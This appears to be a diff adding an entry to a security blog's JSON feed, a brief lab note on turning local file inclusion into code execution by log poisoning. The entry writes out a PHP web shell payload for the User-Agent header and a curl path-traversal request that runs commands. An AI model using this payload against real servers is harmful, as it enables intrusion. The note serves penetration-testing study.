@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/04/03/lfi-using-access-logs-log-poisoning",
+            "title": "LFI - Using access logs (Log Poisoning)",
+            "summary": "LFI - Using access logs (Log Poisoning)",
+            "content_text": "Steps  Ensure you can do LFI on access logs  Insert this on useragent parameter&lt;?php echo shell_exec($_GET['cmd']);?&gt;  Include the logs on next requestcurl 'http://10.10.8.194/?view=../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=whoami'            reference: [Remote Code Execution With LFI      C:\\Helich0pper](https://helich0pper.github.io/LFI/)      References  HTB bart",
+            "content_html": "<h2 id=\"steps\">Steps</h2><ul>  <li>Ensure you can do LFI on access logs</li>  <li>Insert this on useragent parameter</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>&lt;?php echo shell_exec($_GET['cmd']);?&gt;</code></pre></div></div><p><img src=\"/spindel/assets/LFI%20-%20Using%20access%20logs%20(Log%20Poisoning)/burp-changing-user-agent.png\" alt=\"\" /></p><ul>  <li>Include the logs on next request</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl 'http://10.10.8.194/?view=../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=whoami'</code></pre></div></div><table>  <tbody>    <tr>      <td>reference: [Remote Code Execution With LFI</td>      <td>C:\\Helich0pper](https://helich0pper.github.io/LFI/)</td>    </tr>  </tbody></table><h2 id=\"references\">References</h2><ul>  <li>HTB bart</li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/04/03/lfi-using-access-logs-log-poisoning",
+            
+            
+            
+            "tags": ["web","lfi","php"],
+            
+            "date_published": "2022-04-03T00:00:00+08:00",
+            "date_modified": "2022-04-03T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/04/03/complicated-sql-payloads",
             "title": "Complicated SQL Payloads",
             "summary": "Complicated SQL Payloads",
